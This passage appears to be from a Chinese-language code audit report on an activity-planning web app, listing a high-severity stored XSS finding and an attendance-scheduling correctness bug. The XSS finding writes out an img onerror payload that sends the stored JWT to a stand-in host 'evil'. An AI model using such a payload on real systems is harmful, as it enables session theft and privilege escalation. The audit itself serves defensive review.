- **严重度**：高　**类别**：安全　**验证**：CONFIRMED　**来源角度**：security
- **失败场景**：攻击者（任何持有 activity:edit 的四部长之一，或被盗的部长账号）直接 PUT /api/plans/{id} 把 purpose 字段存为 `<img src=x onerror="new Image().src='https://evil/?c='+localStorage.getItem('pams_token')">`（PlanService 落库无任何 HTML 净化，前端字段编辑绕过也行）。指导老师/主任打开该活动「策划书」页——页面即编辑器、无独立预览，WordEditor 必挂载（ActivityDetail.tsx:500）——buildDocHtml 把字段原样拼进 HTML 后 parseDocSections 在挂载时执行 `frag.innerHTML = html`，img onerror 触发，把 zustand persist 存于 localStorage['pams_token'] 的 JWT 外带到攻击者服务器；攻击者以 TEACHER 身份调用全部 API（含 user:permission 改 RBAC、读党员台账），实现部长→指导老师提权。对照：单字段编辑器 PlanRichEditor.tsx:77 有 sanitizeEditableHtml 兜底，WordEditor 这条主路径没有。

## 2. 正确性（15 条）

### 4. daySchedules 只查 PUBLISHED 排班，与 AttendanceAutoJob 到点即置 ENDED 的生命周期冲突，迟到扫码丢失本人排班归属

- **失败场景**：活动排班 09:00-10:00 已发布并预建 PENDING 考勤；10:00~10:05 间 AttendanceAutoJob 把该排班置 ENDED、未签到者置 ABSENT；成员 10:10 才扫码（迟到场景）——daySchedules 只查 PUBLISHED 已查不到本人时段：若当天还有 14:00-15:00 时段，persons 只含下午人员，明明有上午排班的本人被 2306"当前活动暂无你的排班记录"拒绝签到；若没有其他时段则宽松落库"签到成功"，但考勤仍是 ABSENT，出现"已签到却记缺勤"。类注释承诺的"超过结束时间=迟到"在任何迟到场景都不会发生。
